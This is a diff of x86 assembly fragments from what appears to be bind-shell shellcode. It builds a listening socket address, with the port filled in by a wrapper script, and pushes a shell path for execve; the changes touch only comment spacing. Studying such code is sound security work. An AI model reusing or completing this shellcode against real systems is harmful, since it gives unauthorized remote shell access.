@@ -59,7 +59,7 @@ _start:
 	push dword eax			; char sin_zero[8] 2/2 => 0x00000000
 	push dword eax			; char sin_zero[8] 1/2 => 0x00000000
 	push dword eax			; struct in_addr => INADDR_ANY = 0x00000000
-	push word PLACEHOLDER	; unsigned short sin_port => inserted by wrapper.py
+	push word PLACEHOLDER		; unsigned short sin_port => inserted by wrapper.py
 	mov bl, 0x2
 	push word bx			; short sin_family => AF_INET = 0x2
 
@@ -137,8 +137,8 @@ _start:
 	;         char *const envp[]);
 
 	push byte 0x68			; ...h
-	push dword 0x7361622f	; sab/
-	push dword 0x6e69622f	; nib/
+	push dword 0x7361622f		; sab/
+	push dword 0x6e69622f		; nib/
 
 	mov ebx, esp			; const char *pathname => *"//bin/sh"
 	xor eax, eax
